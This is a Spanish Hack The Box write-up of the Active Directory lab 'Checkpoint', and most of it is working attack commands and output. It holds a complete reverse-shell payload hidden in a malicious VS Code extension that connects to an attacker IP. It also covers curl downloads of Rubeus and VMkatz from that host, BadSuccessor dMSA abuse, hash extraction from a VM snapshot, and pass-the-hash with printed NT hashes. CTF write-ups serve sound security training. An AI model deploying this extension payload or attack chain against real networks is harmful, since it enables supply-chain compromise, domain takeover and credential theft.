# Writeup: Checkpoint (Hack The Box — Media)

Checkpoint es una máquina **Media** de Active Directory sobre **Windows Server 2025** que modela un entorno corporativo con una peculiaridad clave: el compromiso comienza desde una cuenta de bajo privilegio (`alex.turner`) cuyo único permiso interesante es la **escritura sobre el contenedor `Deleted Objects`**. A lo largo del recorrido, se explota la **Papelera de Reciclaje de AD** para reanimar una cuenta de contratista (`mark.davies`), se abusa de la **reutilización de contraseñas** inferida a partir de las marcas de tiempo del último cambio de contraseña, se compromete una **extensión maliciosa de VS Code** distribuida por un share usado como *drop zone*, se explota la **vulnerabilidad BadSuccessor en dMSA** (una funcionalidad nueva de WS2025) para obtener el hash de una cuenta de servicio con privilegios, y finalmente se realiza un **análisis forense de una snapshot de VMware** con `VMkatz` para extraer el hash del Administrador (reutilizado en todo el dominio) y obtener la flag final desde la cuenta `max.palmer`.

---

## Fase 1: Reconocimiento

Realizamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -sS -p- --min-rate 500 -Pn -n -vv 10.129.187.215 -oG allPorts
```

**Resultado:**

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49708/tcp open  unknown          syn-ack ttl 127
49712/tcp open  unknown          syn-ack ttl 127
```

Usamos `extractPorts` para extraer la IP y los puertos abiertos:

```bash
extractPorts allPorts
```

```bash
[*] Información extraída:
        [*] Dirección IP: 10.129.187.215
        [*] Puertos abiertos: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49670,49671,49677,49678,49695,49708,49712
[+] Puertos copiados al portapapeles
```

Realizamos un escaneo de servicios y versiones:

```bash
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49670,49671,49677,49678,49695,49708,49712 10.129.187.215 -oN targeted
```

**Resultados clave:**

```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)
445/tcp   open  microsoft-ds?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC01; OS: Windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 7h00m01s
```

**Observaciones clave:**

- **Dominio**: `checkpoint.htb`, controlador `DC01.checkpoint.htb`.
- **Windows Server 2025** (build 26100 según `nxc`).
- **SMB signing habilitado y requerido** → descartamos NTLM relay.
- **WinRM abierto (5985)** → potencial para obtener shells limpias con credenciales válidas.
- **Clock skew de 7h** → sincronizar la hora antes de usar Kerberos.

Añadimos el dominio al archivo `/etc/hosts`:

```bash
echo "10.129.187.215 checkpoint.htb dc01.checkpoint.htb" | sudo tee -a /etc/hosts
```

---

## Fase 2: Enumeración de SMB y AD

### 2.1 Verificación de credenciales y enumeración de shares

Se nos proporcionan credenciales de bajo privilegio: `alex.turner:Checkpoint2024!`.

```bash
nxc smb checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --shares
```

**Resultado:**

```
SMB  DC01  [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB  DC01  Share           Permissions     Remark
SMB  DC01  -----           -----------     ------
SMB  DC01  ADMIN$                          Remote Admin
SMB  DC01  C$                              Default share
SMB  DC01  DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB  DC01  IPC$            READ            Remote IPC
SMB  DC01  NETLOGON        READ            Logon server share 
SMB  DC01  SYSVOL          READ            Logon server share 
SMB  DC01  VMBackups  
```

**Observaciones clave:**

- **`DevDrop`**: solo lectura para `alex.turner`, con el comentario que revela la versión exacta del engine de VS Code (`1.118.0`).
- **`VMBackups`**: sin permisos, pero el nombre es muy sugestivo.

### 2.2 Enumeración de usuarios

```bash
nxc smb checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --users
```

**Resultado (extracto):**

```
SMB   DC01  alex.turner        2026-05-09 09:00:08 0
SMB   DC01  ryan.brooks        2026-05-10 13:46:18 0
SMB   DC01  svc_deploy          2026-05-09 09:01:19 0   Deployment service account
SMB   DC01  james.harper        2026-05-09 09:02:53 0
SMB   DC01  sarah.mitchell      2026-05-09 09:02:58 0
SMB   DC01  emily.carter        2026-05-09 09:03:05 0
SMB   DC01  david.reynolds      2026-05-09 09:03:11 0
SMB   DC01  jessica.coleman     2026-05-09 09:03:15 0
SMB   DC01  lauren.flores       2026-05-09 09:03:21 0
SMB   DC01  michael.torres      2026-05-09 09:03:28 0
SMB   DC01  kevin.patterson     2026-05-09 09:03:33 0
SMB   DC01  brian.jenkins       2026-05-09 09:03:37 0
SMB   DC01  megan.perry         2026-05-09 09:03:42 0
SMB   DC01  max.palmer          2026-05-26 01:25:15 0
```

**Observaciones:**

- **`svc_deploy`** es una cuenta de servicio (objetivo clásico de escalada).
- **`max.palmer`** fue creado el 2026-05-26, el más reciente.
- Muchos usuarios comparten el mismo timestamp (~`09:02:53`, `09:02:58`, `09:03:05`...) → **aprovisionamiento en lote**.

### 2.3 Enumeración con BloodHound (usando Kerberos)

`rusthound-ce` no funciona por defecto porque **LDAP signing está habilitado**. La solución es usar Kerberos:

```bash
kinit alex.turner
Password for alex.turner@CHECKPOINT.HTB: Checkpoint2024!
```

```bash
rusthound-ce --domain checkpoint.htb -k -f dc01.checkpoint.htb --zip
```

Importamos el ZIP en BloodHound y analizamos el grafo.

> **Observación con BloodHound (fase inicial):**  
> Al analizar el grafo con nuestra cuenta `alex.turner`, BloodHound muestra que esta cuenta **no pertenece a ningún grupo privilegiado** (solo `Domain Users`) y **no tiene rutas directas de escalada** hacia otros usuarios o grupos. Sin embargo, al pivotar sobre los objetos con permisos especiales, se observa que `alex.turner` tiene un permiso **`GenericWrite`** sobre un usuario **eliminado** (aún visible en BloodHound como objeto huérfano en el contenedor `Deleted Objects`). Este es el primer indicio de que la escalada pasa por la **Papelera de Reciclaje de AD** y no por rutas tradicionales de grupos.

### 2.4 Análisis de permisos con `bloodyAD`

```bash
bloodyad --host dc01.checkpoint.htb -u alex.turner -d checkpoint.htb -p Checkpoint2024! get writable
```

**Resultado:**

```
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

**Análisis de los permisos:**

1. **`CN=Deleted Objects` → `DACL: WRITE`**: `alex.turner` puede modificar la DACL del contenedor `Deleted Objects`. Inusual, ya que normalmente solo administradores pueden siquiera listarlo.
2. **`OU=Employees` → `CREATE_CHILD`**: puede crear objetos en la OU `Employees`.
3. **`CN=Mark Davies\0ADEL:...` → `WRITE`**: puede modificar un usuario **eliminado** (`Mark Davies`) que está en `Deleted Objects`. El sufijo `\0ADEL:2217e877-...` indica que es un *tombstone*.
4. Los permisos sobre `Authenticated Users` y las zonas DNS son estándar.

**Conclusión:** Los tres permisos necesarios para reanimar una cuenta (`Write` sobre el objeto eliminado, `CreateChild` sobre la OU de destino y `Reanimate-Tombstones` sobre el dominio) están presentes.

---

## Fase 3: AD Recycle Bin — Reanimación de `mark.davies`

### 3.1 ¿Qué es la Papelera de Reciclaje de AD?

La **AD Recycle Bin** (Windows Server 2008 R2+) permite restaurar objetos eliminados sin reiniciar el DC. Cuando un objeto se elimina:

- Se **desvincula** del árbol y se **mueve** a `CN=Deleted Objects`.
- Se le añade el sufijo `\0ADEL:<GUID>` a su DN.
- **Conserva sus atributos** (incluido el hash de la contraseña) durante el período de retención (180 días por defecto).

El contenedor `Deleted Objects` normalmente **no es visible** para usuarios no administradores.

### 3.2 Los tres requisitos para reanimar una cuenta

1. **`Write` sobre el objeto eliminado** (para modificar sus atributos durante la restauración).
2. **`CreateChild` sobre la OU de destino** (para poder crear el objeto allí).
3. **El derecho extendido `Reanimate-Tombstones` sobre el dominio** (el permiso clave que autoriza la operación).

### 3.3 Verificación del permiso `Reanimate-Tombstones`

```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get object 'DC=checkpoint,DC=htb' --attr nTSecurityDescriptor --resolve-sd | grep -i tombstone
```

**Resultado:**

```
nTSecurityDescriptor.ACL.2.ObjectType: Reanimate-Tombstones
```

Detalle de la ACE:

```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get object 'DC=checkpoint,DC=htb' --attr nTSecurityDescriptor --resolve-sd | grep -F ACL.2.
```

**Resultado:**

```
nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.2.Trustee: alex.turner
nTSecurityDescriptor.ACL.2.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.2.ObjectType: Reanimate-Tombstones
```

**Hallazgo crítico:** `alex.turner` tiene `Reanimate-Tombstones` sobre el dominio. **Cumple los tres requisitos.**

### 3.4 Enumeración del contenedor `Deleted Objects`

```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=checkpoint,DC=htb' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,description,objectSid
```

**Resultado:**

```
distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
lastKnownParent: OU=Employees,DC=checkpoint,DC=htb
objectSid: S-1-5-21-3129162710-3498938529-1807524340-1102
sAMAccountName: mark.davies
```

**Hallazgo:** El objeto eliminado es `mark.davies`, con `lastKnownParent = OU=Employees` (donde tenemos `CreateChild`). Todo encaja.

### 3.5 Reanimación de la cuenta

```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' set restore mark.davies
```

**Resultado:**

```
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

### 3.6 Intento fallido de cambiar la contraseña

Intentamos cambiar la contraseña de `mark.davies` para autenticarnos:

```bash
impacket-changepasswd checkpoint.htb/mark.davies@dc01.checkpoint.htb -reset -altuser alex.turner -altpass 'Checkpoint2024!' -newpass 'k@li1234!'
```

**Resultado:**

```
[-] checkpoint.htb\alex.turner user is not allowed to set the password of the target
```

No tenemos `ForceChangePassword`. La solución vendrá de la reutilización de contraseña.

---

## Fase 4: Reutilización de contraseña inferida por timestamps

### 4.1 El timestamp como indicador

Recordemos la salida de la enumeración de usuarios:

```
alex.turner    2026-05-09 09:00:08
mark.davies    2026-05-09 09:00:48
```

**Observación crítica:** Ambas cuentas tienen la **misma fecha de último cambio de contraseña**, con **40 segundos de diferencia**. Esto sugiere que fueron creadas por el mismo script o administrador en la misma sesión, lo que hace muy probable que compartan contraseña.

**Nota del autor (por qué esto ocurre en la realidad):**

1. **Aprovisionamiento en lote**: RRHH envía una lista y un script crea todas las cuentas con la misma contraseña inicial (`Welcome2024!`, `CompanyName2024!`, etc.). Timestamps idénticos.

2. **Contraseña por defecto del dominio**: Se asigna una contraseña inicial estándar que el usuario debe cambiar en el primer login. Si el usuario nunca inicia sesión (como un contratista que se va antes del primer día), la contraseña permanece.

3. **Migraciones desde sistemas heredados**: Todas las contraseñas se establecen al mismo tiempo mediante un proceso automatizado.

4. **Reset masivo post-incidente**: Un cambio forzado de contraseñas produce timestamps agrupados.

5. **Copiar usuarios en ADUC**: "Copy" duplica atributos; muchos admins copian la cuenta y asignan manualmente la misma contraseña.

6. **Plantillas de usuario**: Todas las cuentas creadas a partir de una plantilla heredan la contraseña si la plantilla la tenía.

7. **Contratistas y temporales**: Se crean en lote con contraseñas compartidas.

**La lección:** Los timestamps de "último cambio de contraseña" son **metadatos públicos** que cualquier usuario autenticado puede consultar. Un atacante puede usarlos como **oráculo de reutilización de contraseñas**.

### 4.2 Verificación

```bash
nxc smb checkpoint.htb -u 'mark.davies' -p 'Checkpoint2024!'
```

**Resultado:**

```
SMB  DC01  [+] checkpoint.htb\mark.davies:Checkpoint2024!
```

**¡Éxito!** `mark.davies` reutiliza la contraseña de `alex.turner`.

### 4.3 Enumeración de shares como `mark.davies`

```bash
nxc smb checkpoint.htb -u 'mark.davies' -p 'Checkpoint2024!' --shares
```

**Resultado relevante:**

```
SMB  DC01  DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB  DC01  VMBackups  
```

**Hallazgo crítico:** `mark.davies` tiene **READ, WRITE** sobre `DevDrop`. Esto abre la puerta a un ataque de **supply chain**.

### 4.4 Notas de BloodHound sobre `mark.davies`

> **Observación con BloodHound (fase intermedia):**  
> Tras reanimar a `mark.davies` e importar el grafo actualizado (o ejecutar `rusthound-ce` con sus credenciales), BloodHound muestra que `mark.davies` **no pertenece a ningún grupo interesante** (solo `Domain Users`) y **no tiene permisos ACL explotables** sobre otros objetos. Su única capacidad relevante es la **escritura sobre el share `DevDrop`**, que BloodHound no modela como un nodo de escalada de AD pero sí es un vector de **supply chain** hacia `ryan.brooks`. Es decir, la escalada no es "de AD a AD" (vía ACLs), sino "de AD a host" (vía share y tarea programada).

---

## Fase 5: Supply Chain — Extensión maliciosa de VS Code

### 5.1 ¿Qué es una extensión de VS Code?

**VS Code** soporta extensiones (`.vsix`, paquetes ZIP con `package.json` y `out/extension.js`) que se ejecutan **con los privilegios del usuario** que ejecuta VS Code. Una extensión maliciosa puede ejecutar comandos arbitrarios.

**El vector:** Si colocamos una extensión maliciosa en un share donde se instala automáticamente (o donde un admin la instala), comprometemos las máquinas del equipo.

### 5.2 Creación de la extensión maliciosa

```bash
npx --package yo --package generator-code -- yo code
```

Seleccionamos:

```
New Extension (TypeScript)
Name: kali
Identifier: kali
Description: hacked
Git: No
Bundler: unbundled
Package manager: npm
```

### 5.3 Payload de reverse shell

Modificamos `src/extension.ts`:

```typescript
import * as vscode from 'vscode';

export function activate(context: vscode.ExtensionContext) {

    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd.exe", []);
    var client = new net.Socket();
    client.connect(443, "10.10.17.71", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
}

export function deactivate() {}
```

**Análisis del payload:**

- `require("net")`, `require("child_process")`: módulos de Node.js.
- `cp.spawn("cmd.exe", [])`: lanza una shell de Windows.
- `net.Socket()` + `client.connect(...)`: socket TCP hacia nuestra máquina.
- `client.pipe(sh.stdin)` / `sh.stdout.pipe(client)`: puente entre la red y la shell.

**Nota:** Inicialmente probamos con `sh` para testear en Linux; para la víctima Windows usamos `cmd.exe`.

### 5.4 Configuración del `package.json`

Modificamos tres campos:

**1. Activación automática:**
```json
"activationEvents": ["onStartupFinished"],
```

**2. Compatibilidad de engine (crítico):**
```json
"engines": {
    "vscode": "^1.118.0"
},
```
El share indica que la extensión debe ser compatible con el engine `1.118.0`. Si dejamos la versión por defecto (más nueva), el VS Code de la víctima no la instalará.

**3. Tipos de VS Code:**
```json
"devDependencies": {
    "@types/vscode": "^1.118.0",
    ...
}
```

### 5.5 Empaquetado

```bash
npm install -g @vscode/vsce
cd kali
vsce package
```

**Resultado:** Se genera `kali-0.0.1.vsix`.

### 5.6 Subida al share

```bash
smbclient //checkpoint.htb/DevDrop -U 'mark.davies%Checkpoint2024!'
```

```bash
smb: \> put kali-0.0.1.vsix
putting file kali-0.0.1.vsix as \kali-0.0.1.vsix
```

### 5.7 Shell como `ryan.brooks`

```bash
nc -nlvp 443
```

Esperamos unos minutos (el tiempo que tarde la tarea programada en instalar la extensión) y recibimos:

```cmd
connect to [10.10.17.71] from (UNKNOWN) [10.129.188.245] 52301
Microsoft Windows [Version 10.0.26100.32860]
C:\Program Files\Microsoft VS Code>whoami
checkpoint\ryan.brooks
```

**Hallazgo crítico:** Una **tarea programada** instaló automáticamente nuestra extensión y, al activarse (`onStartupFinished`), ejecutó el payload con los privilegios de `ryan.brooks`. Es un **supply chain attack** de manual.

### 5.8 Enumeración como `ryan.brooks`

```powershell
PS C:\> dir
```

**Resultado:**

```
d-----         5/18/2026   6:31 PM                Scripts
d-----          5/9/2026   7:42 AM                Shares
d-r---         5/25/2026   6:34 PM                Users
d-----         5/21/2026   4:22 PM                Windows
```

```powershell
PS C:\shares> dir
```

```
d-----         11/1/2026   9:59 PM                DevDrop
d-----          5/9/2026  10:15 AM                VMBackups
```

```powershell
PS C:\shares> cd vmbackups
PS C:\shares\vmbackups> dir
dir : Access to the path 'C:\shares\vmbackups' is denied.
```

`ryan.brooks` no tiene acceso a `VMBackups`. Necesitamos otro usuario.

### 5.9 Notas de BloodHound sobre `ryan.brooks`

> **Observación con BloodHound (fase de escalada):**  
> Al importar el grafo con las credenciales de `ryan.brooks`, BloodHound revela una **ruta de escalada clave**: `ryan.brooks` tiene el permiso **`GenericWrite`** sobre la cuenta de servicio **`svc_deploy`**. Esta cuenta de servicio pertenece a dos grupos muy relevantes:
>
> - **`Remote Management Users`**: permite autenticarse por WinRM y obtener una shell interactiva en el DC.
> - **`Backup Access`** (o equivalente): otorga permisos de lectura sobre el share **`VMBackups`**, que es exactamente el objetivo que no pudimos alcanzar como `ryan.brooks`.
>
> Además, BloodHound muestra que `ryan.brooks` tiene `CreateChild` sobre la OU **`DMSAHolder`**, lo cual es una pista directa hacia la explotación de **dMSA / BadSuccessor**. En este punto, BloodHound nos está indicando que la escalada no pasa por un cambio de contraseña ni por Kerberoasting (la cuenta no tiene SPN ni contraseña crackeable), sino por un **abuso de dMSA** en un dominio WS2025.

---

## Fase 6: BadSuccessor — Abuso de dMSA

### 6.1 ¿Qué son las dMSA?

**Delegated Managed Service Accounts (dMSA)** son la funcionalidad introducida en **Windows Server 2025** para reemplazar a sAMSA, gMSA y cuentas de usuario usadas como servicio. Una dMSA puede "suceder" a una cuenta heredada durante una migración, heredando sus SIDs (privilegios) y sus claves Kerberos.

**Atributos clave:**

- **`msDS-ManagedAccountPrecededByLink`** (en la dMSA): DN de la cuenta heredada.
- **`msDS-SupersededManagedAccountLink`** (en la cuenta heredada): DN de la dMSA.
- **`msDS-DelegatedMSAState`** / **`msDS-SupersededServiceAccountState`**: estados de la migración.

**Flujo previsto:**

1. Se crea una dMSA.
2. Se configura `msDS-ManagedAccountPrecededByLink` apuntando a la cuenta heredada.
3. El KDC, al autenticar la dMSA, incluye los **SIDs** y **claves Kerberos** de la cuenta heredada en el TGT.
4. El servicio migra suavemente a la nueva cuenta.

### 6.2 La vulnerabilidad (BadSuccessor)

**Causa raíz:** El KDC no valida adecuadamente que el solicitante tenga permiso para heredar los privilegios de la cuenta heredada. Concretamente, bastaba con:

- **`CreateChild` sobre una OU** (para crear la dMSA).
- **`GenericWrite` sobre una cuenta** (para modificar `msDS-ManagedAccountPrecededByLink`).

**Impacto:** Un atacante puede:

1. Crear una dMSA en una OU controlada.
2. Apuntarla a una cuenta privilegiada (`svc_deploy`).
3. Autenticarse como la dMSA → obtener un TGT que contiene el **NT hash de `svc_deploy`**.

**El "post-patch":** Microsoft publicó **KB5063880** que añade una verificación de `WriteProperty` específicamente sobre `msDS-ManagedAccountPrecededByLink` y bloquea Domain Admins como cuenta heredada. Esta máquina está sin parchear.

**Referencia:** Ataque descubierto por Akamai, llamado **BadSuccessor**.

### 6.3 Obtención del TGT de `ryan.brooks`

Usamos `Rubeus` para extraer el TGT del usuario actual (sin conocer su contraseña en texto plano) mediante `tgtdeleg`:

```powershell
PS C:\Programdata> curl http://10.10.17.71:8000/Rubeus.exe -o r.exe
PS C:\Programdata> .\r.exe tgtdeleg
```

**Resultado (extracto):**

```
[*] Action: Request Fake Delegation TGT (current user)
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Extracted the service ticket session key from the ticket cache: IwxKwgTh2306l18U8RzRiBAwWymAweEd4MJiV9DeP/8=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi): doIF...
```

Convertimos el ticket a formato `.ccache`:

```bash
base64 -d tgt.b64 > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan.ccache
export KRB5CCNAME=$(pwd)/ryan.ccache
```

### 6.4 Enumeración de permisos con `ryan.brooks`

```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -k get writable
```

**Resultado:**

```
distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE
```

**Hallazgos críticos:**

- **`OU=DMSAHolder` → `CREATE_CHILD`**: podemos crear la dMSA.
- **`CN=svc_deploy` → `WRITE`**: podemos modificar la cuenta heredada.

Estos son **exactamente los permisos de BadSuccessor**.

### 6.5 Explotación con `bloodyAD`

```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -k add badSuccessor kali_dmsa --ou 'OU=DMSAHOLDER,DC=CHECKPOINT,DC=HTB' -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB'
```

**Resultado (extracto):**

```
[+] Creating DMSA kali_dmsa$ in OU=DMSAHOLDER,DC=CHECKPOINT,DC=HTB
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB
...
[+] dMSA TGT stored in ccache file kali_dmsa_Ik.ccache

dMSA current keys found in TGS:
AES256: b69b5b7efb6408af093a13dfad05e5b39aca24e4cf832133f5f50c116951bc8e
AES128: 0caf8c05b2842fa483c97c9c42d531a5
RC4: a16d6efad12ef62035d5e98c3e040a73

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

**Análisis del resultado:**

- **`dMSA TGT stored in kali_dmsa_Ik.ccache`**: TGT de la nueva dMSA.
- **`current keys`**: claves actuales de `kali_dmsa$` (RC4 = NT hash de `kali_dmsa$`).
- **`previous keys`**: ¡la mina de oro! El RC4 `e16081eb077aca74bdbf8af12af43ac9` es el **NT hash de `svc_deploy`** (cuenta heredada).

**¿Por qué el TGT contiene el NT hash de la cuenta heredada?** Porque, por diseño, la dMSA debe poder autenticarse como la cuenta heredada durante la transición. El KDC incluye las claves de la cuenta heredada en el material del ticket. **Esta es la esencia de BadSuccessor.**

### 6.6 Pass-the-Hash como `svc_deploy`

```bash
nxc winrm checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
```

**Resultado:**

```
WINRM  DC01  [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 (Pwn3d!)
```

**Hallazgo:** PTH exitoso. El `(Pwn3d!)` confirma privilegios de administración / Remote Management.

### 6.7 Acceso al share `VMBackups`

```powershell
*Evil-WinRM* PS C:\shares\vmbackups> dir
```

**Resultado:**

```
    Directory: C:\shares\vmbackups

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2026   9:54 AM                NightlyBackup_2024-11-01
```

```powershell
*Evil-WinRM* PS C:\shares\vmbackups\NightlyBackup_2024-11-01\memory forensics> ls
```

**Resultado:**

```
-a----          5/9/2026   7:45 PM      106496000 Windows Server 2019-000001.vmdk
-a----          5/9/2026   7:40 PM     2147483648 Windows Server 2019-Snapshot1.vmem
-a----          5/9/2026   7:40 PM      138164859 Windows Server 2019-Snapshot1.vmsn
-a----          5/9/2026   7:39 PM         270840 Windows Server 2019.nvram
-a----          5/9/2026   7:45 PM           7642 Windows Server 2019.scoreboard
-a----          5/9/2026   7:39 PM    10199695360 Windows Server 2019.vmdk
-a----          5/9/2026   7:39 PM            502 Windows Server 2019.vmsd
-a----          5/9/2026   7:45 PM           2749 Windows Server 2019.vmx
-a----          5/9/2026   7:22 PM            274 Windows Server 2019.vmxf
```

**Hallazgo:** Snapshot de VMware de un Windows Server 2019 desmantelado (2 GB `.vmem`, 138 MB `.vmsn`, 10 GB `.vmdk`). Descargar 12 GB por WinRM es inviable. Analizamos in situ con `VMkatz`.

---

## Fase 7: Forense de VM — VMkatz

### 7.1 ¿Qué es VMkatz?

**VMkatz** (https://github.com/nikaiw/VMkatz) es una herramienta que extrae credenciales de Windows directamente de **archivos de VM** (snapshots, VMDK, backups de Veeam) sin necesidad de convertirlos a crash dump ni descargarlos. Binario estático de ~3 MB.

Extrae: SAM hashes, LSA Secrets, DPAPI Master Keys, tickets Kerberos, NTDS.dit, BitLocker keys.

### 7.2 Ejecución

```powershell
PS C:\Programdata> curl http://10.10.17.71:8000/vmkatz.exe -o v.exe
PS C:\shares\vmbackups\NightlyBackup_2024-11-01\memory forensics> \programdata\v.exe "Windows Server 2019-Snapshot1.vmsn"
```

**Resultado (extracto):**

```
[+] Bootkey: 75247bc64fa0086d2c98744d4bcd53f5
[+] SAM Hashes:
  RID: 500   Administrator         NT:f29e9c014295b9b32139b09a2790be3b
...
  LUID: 0x14016d
  Session: 2 | LogonType: Unknown
  Username: Administrator
  Domain: WIN-0DG6SJAEUTA
  [MSV1_0]
    NT Hash : f29e9c014295b9b32139b09a2790be3b
```

**Hallazgo crítico:** El NT hash del `Administrator` **local de la VM** es `f29e9c014295b9b32139b09a2790be3b`. Según la descripción de la máquina, este hash ha sido **reutilizado en todo el dominio** (el `Administrator` del dominio usa la misma contraseña).

---

## Fase 8: PTH y flag final

### 8.1 PTH como `Administrator`

```bash
nxc winrm checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
```

**Resultado:** `(Pwn3d!)` — acceso como `Administrator` del dominio.

### 8.2 Enumeración del escritorio de Administrator

```powershell
*Evil-WinRM* PS C:\Users\Administrator> tree /f
```

**Resultado:**

```
C:.
+---Contacts
+---Desktop
+---Documents
+---Downloads
+---Favorites
...
```

**El escritorio de `Administrator` está vacío.** La flag no está aquí.

### 8.3 Notas de BloodHound sobre `max.palmer`

> **Observación con BloodHound (fase final):**  
> Revisando el grupo **`Domain Admins`** en BloodHound (o la consulta de miembros con `net group "Domain Admins" /domain`), se observa que el grupo **no contiene solo a `Administrator`**. También está **`max.palmer`**, un usuario creado recientemente (2026-05-26) y que aparentemente también tiene privilegios de administración del dominio.
>
> Esto es una pista clave: en muchos entornos AD, el grupo `Domain Admins` contiene múltiples cuentas (administradores delegados, cuentas personales de sysadmins, cuentas de servicio, etc.). La flag de una máquina no siempre está en el escritorio de `Administrator`; puede estar en el de cualquier otro Domain Admin. En este caso, `max.palmer` es el candidato.
>
> Además, dado que la descripción de la máquina menciona que el hash del `Administrator` ha sido **reutilizado**, es muy probable que `max.palmer` use la misma contraseña/hash. Lo verificamos directamente con PTH.

### 8.4 PTH como `max.palmer`

```bash
nxc winrm checkpoint.htb -u max.palmer -H f29e9c014295b9b32139b09a2790be3b
```

**Resultado:** Acceso exitoso. Confirmamos la reutilización del hash entre `Administrator` y `max.palmer`.

### 8.5 Flag final

```powershell
*Evil-WinRM* PS C:\Users\max.palmer> tree /f
```

**Resultado:**

```
C:.
+---Contacts
+---Desktop
¦       root.txt
+---Documents
...
```

```powershell
*Evil-WinRM* PS C:\Users\max.palmer\Desktop> type root.txt
```

Obtenemos la **flag final**.

**Lección:** "Administrator" no es el único Domain Admin. Siempre hay que enumerar `Domain Admins` con BloodHound y probar todos los administradores. Además, la reutilización de contraseñas (incluida la del Administrator) permite que un solo hash comprometa todo el dominio.

---

## 📌 Conclusión

Checkpoint es una máquina **Media** que combina técnicas avanzadas y recientes:

1. **Reconocimiento** y enumeración SMB/AD.
2. **AD Recycle Bin** — Reanimación de `mark.davies` con `Write` + `CreateChild` + `Reanimate-Tombstones`.
3. **Reutilización de contraseña** inferida por timestamps.
4. **Supply chain** con extensión maliciosa de VS Code → shell como `ryan.brooks`.
5. **BadSuccessor (dMSA abuse)** — NT hash de `svc_deploy` en un dominio WS2025.
6. **Forense de VM** con `VMkatz` → NT hash del Administrator local de una snapshot.
7. **Pass-the-Hash** como Administrator y como `max.palmer` (hash reutilizado) → flag final.

---

## 📚 Lecciones aprendidas

